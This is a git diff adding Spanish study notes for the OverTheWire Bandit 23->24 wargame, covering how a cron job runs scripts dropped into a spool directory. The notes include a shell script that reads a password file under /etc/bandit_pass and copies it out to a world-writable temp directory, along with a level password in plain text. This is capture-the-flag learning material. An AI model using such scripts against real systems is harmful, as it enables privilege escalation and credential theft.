@@ -1718,5 +1718,149 @@ bandit22@bandit:/etc/bandit_pass$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 
 ```
 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+## bandit 23->24
+
+**AVISO**: OverTheWire ha estado realizando una serie de cambios, comunicaros que ahora en vez de la ruta ‘**/var/spool/bandit24/**‘ tenéis que emplear la ruta ‘**/var/spool/bandit24/foo**‘, por lo demás, todo sigue igual.
+
+Y con esta clase ¡concluimos las tareas Cron!
+
+Esta parte deciros que es fundamental, sobre todo de cara a los módulos de Hacking que vamos a estar tocando en la academia, pues en muchas de las ocasiones veremos cómo nos será necesario no sólo identificar qué tareas se ejecutan en el sistema a intervalos regulares de tiempo, sino también saber cómo poder abusar de estas para elevar nuestros privilegios.
+
+¡Pero lo bueno se hace esperar!, lo primero es lo primero, tenemos que cimentar las bases y no construir la casa por el tejado.
+
+[A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
+
+**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…]
+
+[Un programa se está ejecutando automáticamente a intervalos regulares de cron, el programador de trabajo basado en el tiempo. Mire en /etc/cron.d/ para la configuración y vea qué comando está siendo ejecutado. 
+NOTA: Este nivel requiere que crees tu propio primer guión. Este es un paso muy grande y deberías estar orgulloso de ti mismo cuando venciste a este nivel.
+
+NOTA 2: Ten en cuenta que tu script de shell se elimina una vez ejecutado, por lo que puede querer mantener una copia alrededor de... ]
+
+#### se esta ejecutando un script en
+
+```
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ 
+```
+
+#### vamos a verlo
+
+```
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+#### si cateamos el archivo, permiso denegado
+
+```
+ cat /var/spool/bandit24/foo/
+cat: /var/spool/bandit24/foo/: Permission denied
+
+# tenemos permiso w-x
+
+ls -l /var/spool/bandit24
+total 4
+drwxrwx-wx 17 root bandit24 4096 Jul  7 19:40 foo
+```
+
+#stat ve info sobre el directrio vg:
+
+(bandit23@bandit:/var/spool$ stat bandit24/
+  File: bandit24/
+  Size: 4096      	Blocks: 8          IO Block: 4096   directory
+Device: 259,1	Inode: 539613      Links: 3
+Access: (0550/dr-xr-x---)  Uid: (11024/bandit24)   Gid: (11023/bandit23)
+Access: 2024-07-07 12:53:08.431240985 +0000
+Modify: 2024-06-20 04:07:07.700114670 +0000
+Change: 2024-06-20 04:07:07.710114709 +0000
+ Birth: 2024-06-20 04:07:07.700114670 +0000)
+
+#### creamos un direcrotio temporal 
+
+```
+dir_name=$(mktemp -d)  se guarda la variable y queda mas comodo
+
+echo $dir_name {no me funciono} bah
+
+```
+
+#### creamos un script
+
+```
+#!/bin/bash
+
+
+cp /etc/bandit_pass/bandit24 > /tmp/tmp.Tv8ii0lAK3/bandit24_password.log
+chmod +x /tmp/tmp.Tv8ii0lAK3/bandit24_password.log
+```
+
+#### ahora fuera le pasamos permisos a otros
+
+```
+chmod o+wx /tmp/tmp.Tv8ii0lAK3
+```
+
+#### creamos una copia y chekear si se crearon los permisos
+
+```
+cp script.sh /var/spool/bandit24/example
+```
+
+#watch
+
+```
+watch -n 1 ls -l   (esto va monitorear cada segundo lo que pasa en el directorio)
+```
+
+#### a s4vi no le funciono y saco el cp por el cat para hacer un verbose
+
+```
+#!/bin/bash
+
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.Tv8ii0lAK3/bandit24_password.log
+chmod +x /tmp/tmp.Tv8ii0lAK3/bandit24_password.log
+```
+
+#### nuevamente copiamos el script
+
+```
+cp script.sh /var/spool/bandit24/testing
+```
+
+#### esperamos para ver si se ejecutan los comandos
+
+```
+watch -n 1 ls -l
+```
+
+ 
+
+
 ```
 --------------------------------------------------------------------------------------------------------------------------------------------
